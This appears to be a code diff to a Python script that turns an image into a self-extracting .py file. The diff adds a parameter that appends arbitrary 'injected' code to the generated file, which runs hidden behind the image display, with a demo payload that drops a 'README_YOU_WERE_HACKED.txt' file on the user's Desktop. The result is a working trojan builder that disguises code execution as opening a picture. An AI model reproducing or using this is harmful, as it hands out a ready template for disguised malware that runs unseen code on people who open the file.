@@ -19,7 +19,7 @@ FILE_NAME = 'image_png.py'
 
 
 # SOURCE: https://github.com/gil9red/SimplePyScripts/blob/aec64c1749d4f6f3176e3222c7e7c554f40c693f/generator_py_with_inner_image_with_open/main.py
-def generate(file_name):
+def generate(file_name, inject_code: str):
     with open(file_name, 'rb') as f:
         img_bytes = f.read()
 
@@ -38,28 +38,39 @@ IMAGE = "{}"
 import base64
 img_bytes = base64.b64decode(IMAGE)
 
-import os
-import tempfile
-
 def save_and_run():
+    import os
+    import tempfile
+    
     NEW_FILE_NAME = os.path.join(tempfile.gettempdir(), FILE_NAME_IMAGE)
-
+        
     # Save file
     with open(NEW_FILE_NAME, 'wb') as f:
         f.write(img_bytes)
-
+    
     os.startfile(NEW_FILE_NAME)
 
-'''.format(file_name, img_base64))
+save_and_run()
+
+# INJECTED CODE
+{}
+'''.format(file_name, img_base64, inject_code))
 
 
 if __name__ == '__main__':
     file_name = 'image.jpg'
+    inject_code = """
+import os.path
+from pathlib import Path
 
-    # Save to ico
-    convert_image_to_ico(file_name, 'icon.ico', icon_sizes=[(16, 16), (32, 32), (48, 48), (64, 64)])
+file_name = Path(os.path.expanduser("~/Desktop")).resolve() / "README_YOU_WERE_HACKED.txt"
+file_name.touch(exist_ok=True)
+    """
 
-    generate(file_name)
+    # # Save to ico
+    # convert_image_to_ico(file_name, 'icon.ico', icon_sizes=[(16, 16), (32, 32), (48, 48), (64, 64)])
+
+    generate(file_name, inject_code)
 
     # # Test image_png
     # import image_png
